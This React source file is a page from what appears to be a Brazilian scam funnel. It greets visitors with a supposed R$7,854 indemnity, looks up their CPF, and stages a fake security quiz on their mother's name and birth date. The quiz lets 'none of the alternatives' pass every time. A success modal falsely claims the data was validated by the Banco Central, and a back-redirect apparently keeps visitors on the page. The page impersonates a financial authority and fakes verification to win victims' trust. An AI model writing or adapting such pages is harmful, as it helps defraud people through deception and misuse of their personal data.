import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';
import BackRedirect from '../components/BackRedirect';
import { X, Check } from 'lucide-react';
import { navigateWithParams } from '../utils/urlParams';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';

const ChatPage: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const funnelData = getFunnelData();
  const { cpf: stateCpf, indemnityAmount: stateIndemnityAmount, urlParams, userData: stateUserData } = location.state || {};
  const cpf = stateCpf || funnelData.cpf;
  const userData = stateUserData || funnelData.userData;
  const indemnityAmount = stateIndemnityAmount || 7854.63;
  const [currentStep, setCurrentStep] = useState(1);
  const [selectedOption, setSelectedOption] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);

    if (!cpf) {
      navigate('/');
      return;
    }

    saveFunnelData({
      cpf: cpf,
      userData: userData,
      currentStep: '/chat'
    });
  }, [cpf, userData, navigate]);

  if (!cpf) return null;

  // Build complete URL parameters including UTMs
  const currentParams = new URLSearchParams(location.search);
  currentParams.set('cpf', cpf);

  // Add any additional parameters from state
  if (urlParams) {
    const stateParams = new URLSearchParams(urlParams);
    stateParams.forEach((value, key) => {
      if (!currentParams.has(key)) {
        currentParams.set(key, value);
      }
    });
  }

  const motherName = userData?.mae || '';
  const birthDate = userData?.dataNascimento || '';

  // Helper function to format date if needed (converts YYYY-MM-DD to DD/MM/YYYY)
  const formatDate = (date: string) => {
    if (!date) return '';

    // If already in DD/MM/YYYY format, return as is
    if (date.includes('/')) return date;

    // If in YYYY-MM-DD format, convert to DD/MM/YYYY
    if (date.includes('-')) {
      const [year, month, day] = date.split('-');
      return `${day}/${month}/${year}`;
    }

    return date;
  };

  const formattedBirthDate = formatDate(birthDate);

  // Helper function to generate fake dates
  const generateFakeDates = (correctDate: string) => {
    const fakeDates = [
      '15/03/1985',
      '22/07/1978',
      '27/11/1993'
    ];
    return fakeDates.filter(date => date !== correctDate);
  };

  // Check if mother name exists in API data
  const hasMotherName = motherName && motherName.trim().length > 0 && motherName !== 'Não informado';

  // Fixed options - mother's name always in 4th position (if exists)
  const motherOptions = [
    'Maria da Silva Santos',
    'Ana Paula Oliveira',
    'Ana Cristina Ferreira',
    ...(hasMotherName ? [motherName] : []),
    'Nenhuma das Alternativas'
  ];

  // Date options - correct date always in 2nd position
  const fakeDates = generateFakeDates(formattedBirthDate);
  const dateOptions = [
    fakeDates[0],
    formattedBirthDate,
    fakeDates[1],
    fakeDates[2],
    'Nenhuma das Alternativas'
  ];

  const handleOptionSelect = (option: string) => {
    if (isProcessing) return;

    setSelectedOption(option);
    setIsProcessing(true);

    // If "Nenhuma das Alternativas" is selected, always proceed to next step
    if (option === 'Nenhuma das Alternativas') {
      if (currentStep === 1) {
        // Go to step 2
        setTimeout(() => {
          setCurrentStep(2);
          setSelectedOption(null);
          setIsProcessing(false);
        }, 300);
      } else {
        // Go to next page
        setTimeout(() => {
          setShowSuccessModal(true);
          setTimeout(() => {
            navigateWithParams(
              navigate,
              '/verificando-dados',
              location,
              {
                userData,
                indemnityAmount
              }
            );
          }, 1500);
        }, 300);
      }
      return;
    }

    // Validate the selection
    let isCorrect = false;

    if (currentStep === 1) {
      // For mother's name step
      if (hasMotherName) {
        // If API has mother name, only that option is correct
        isCorrect = option === motherName;
      } else {
        // If API doesn't have mother name, any wrong option shows error
        isCorrect = false;
      }

      if (isCorrect) {
        setTimeout(() => {
          setCurrentStep(2);
          setSelectedOption(null);
          setIsProcessing(false);
        }, 300);
      } else {
        setTimeout(() => {
          setShowErrorModal(true);
          setSelectedOption(null);
          setIsProcessing(false);
        }, 300);
      }
    } else {
      // For birth date step
      isCorrect = option === formattedBirthDate;

      if (isCorrect) {
        setTimeout(() => {
          setShowSuccessModal(true);
          setTimeout(() => {
            navigateWithParams(
              navigate,
              '/verificando-dados',
              location,
              {
                userData,
                indemnityAmount
              }
            );
          }, 1500);
        }, 300);
      } else {
        setTimeout(() => {
          setShowErrorModal(true);
          setSelectedOption(null);
          setIsProcessing(false);
        }, 300);
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <BackRedirect />
      <Header />

      <main className="flex-1 flex items-center justify-center pt-24 md:pt-32 pb-12 md:pb-20 px-4 md:px-6">
        <div className="max-w-lg mx-auto">
          <div className="text-center mb-6 md:mb-8 animate-fade-in-down">
            <h1 className="text-2xl md:text-3xl font-semibold text-purple-600 mb-2 md:mb-3">
              Confirmação de Segurança
            </h1>
            <p className="text-sm md:text-base text-purple-600">
              Verificação de Segurança Para Proteger Sua Conta!
            </p>
          </div>

          <div className="flex justify-center items-center gap-2 md:gap-3 mb-6 md:mb-8 animate-slide-in">
            <div className={`flex items-center justify-center w-10 h-10 md:w-12 md:h-12 rounded-full font-semibold text-sm md:text-base ${
              currentStep > 1 ? 'bg-green-500 text-white' : 'bg-purple-600 text-white'
            }`}>
              {currentStep > 1 ? <Check className="w-5 h-5 md:w-6 md:h-6" /> : '1'}
            </div>
            <div className={`w-8 h-1 md:w-12 ${currentStep > 1 ? 'bg-green-500' : 'bg-purple-200'}`}></div>
            <div className={`flex items-center justify-center w-10 h-10 md:w-12 md:h-12 rounded-full font-semibold text-sm md:text-base ${
              currentStep === 2 ? 'bg-purple-600 text-white' : 'bg-purple-200 text-purple-500'
            }`}>
              2
            </div>
          </div>

          <div className="text-center mb-6 md:mb-8 animate-fade-in-delayed">
            <h2 className="text-xl md:text-2xl font-semibold text-purple-600 mb-2">
              {currentStep === 1 ? 'Etapa 1 de 2' : 'Última Etapa!'}
            </h2>
            <p className="text-sm md:text-base text-purple-600">
              {currentStep === 1 ? 'Confirme o nome da sua mãe' : 'Confirme sua data de nascimento'}
            </p>
          </div>

          <div className="space-y-3">
            {(currentStep === 1 ? motherOptions : dateOptions).map((option, index) => (
              <button
                key={`${currentStep}-${index}`}
                onClick={() => handleOptionSelect(option)}
                disabled={isProcessing}
                className={`w-full flex items-center gap-3 p-4 text-left rounded-2xl border-2 transition-all animate-slide-in-stagger ${
                  selectedOption === option
                    ? 'border-purple-500 bg-purple-50'
                    : 'border-gray-200 bg-white hover:border-gray-300'
                } ${isProcessing ? 'opacity-50 cursor-not-allowed' : ''}`}
                style={{ animationDelay: `${0.3 + index * 0.1}s` }}
              >
                <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
                  selectedOption === option
                    ? 'border-purple-500'
                    : 'border-gray-300'
                }`}>
                  {selectedOption === option && (
                    <div className="w-3 h-3 rounded-full bg-purple-500"></div>
                  )}
                </div>
                <span className="text-base text-gray-900 font-medium">{option}</span>
              </button>
            ))}
          </div>
        </div>
      </main>

      {showErrorModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 px-4 animate-fade-in">
          <div className="bg-white rounded-lg shadow-lg p-8 md:p-12 max-w-md w-full animate-scale-in">
            <div className="flex flex-col items-center">
              <div className="w-16 h-16 md:w-24 md:h-24 bg-red-600 rounded-full flex items-center justify-center mb-6 md:mb-8 animate-bounce-in">
                <X className="w-10 h-10 md:w-14 md:h-14 text-white" strokeWidth={3} />
              </div>

              <h2 className="text-xl md:text-2xl font-bold text-purple-600 mb-2 md:mb-3 text-center animate-slide-up">
                Ops! Tente Novamente
              </h2>
              <p className="text-sm md:text-base text-purple-600 text-center leading-relaxed mb-6 md:mb-8 animate-slide-up-delayed">
                Selecione a opção que corresponde exatamente aos seus documentos oficiais
              </p>

              <button
                onClick={() => {
                  setShowErrorModal(false);
                  setSelectedOption(null);
                }}
                className="w-full bg-purple-600 text-white font-semibold py-3 md:py-4 text-sm md:text-base rounded-xl hover:bg-purple-700 transition-colors animate-slide-up-delayed-2"
              >
                Tentar Novamente
              </button>
            </div>
          </div>
        </div>
      )}

      {showSuccessModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 px-4 animate-fade-in">
          <div className="bg-white rounded-lg shadow-lg p-8 md:p-12 max-w-md w-full animate-scale-in">
            <div className="flex flex-col items-center">
              <div className="w-16 h-16 md:w-24 md:h-24 bg-green-500 rounded-full flex items-center justify-center mb-6 md:mb-8 animate-bounce-in">
                <Check className="w-10 h-10 md:w-14 md:h-14 text-white" strokeWidth={3} />
              </div>

              <h2 className="text-xl md:text-2xl font-bold text-purple-600 mb-2 md:mb-3 text-center animate-slide-up">
                Informação Confirmada!
              </h2>
              <p className="text-sm md:text-base text-purple-600 text-center leading-relaxed animate-slide-up-delayed">
                Dados validados com sucesso pelo sistema do Banco Central
              </p>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fade-in {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fade-in 0.3s ease-out;
        }

        @keyframes fade-in-down {
          from {
            opacity: 0;
            transform: translateY(-20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in-down {
          animation: fade-in-down 0.5s ease-out;
        }

        @keyframes fade-in-delayed {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in-delayed {
          animation: fade-in-delayed 0.5s ease-out 0.2s backwards;
        }

        @keyframes slide-in {
          from {
            opacity: 0;
            transform: translateX(-30px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }
        .animate-slide-in {
          animation: slide-in 0.5s ease-out 0.1s backwards;
        }

        @keyframes slide-in-stagger {
          from {
            opacity: 0;
            transform: translateX(-20px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }
        .animate-slide-in-stagger {
          animation: slide-in-stagger 0.4s ease-out backwards;
        }

        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.9);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-scale-in {
          animation: scale-in 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes bounce-in {
          0% {
            opacity: 0;
            transform: scale(0);
          }
          50% {
            transform: scale(1.1);
          }
          100% {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-bounce-in {
          animation: bounce-in 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes slide-up {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-slide-up {
          animation: slide-up 0.4s ease-out 0.1s backwards;
        }
        .animate-slide-up-delayed {
          animation: slide-up 0.4s ease-out 0.2s backwards;
        }
        .animate-slide-up-delayed-2 {
          animation: slide-up 0.4s ease-out 0.3s backwards;
        }
      `}</style>

      <Footer />
    </div>
  );
};

export default ChatPage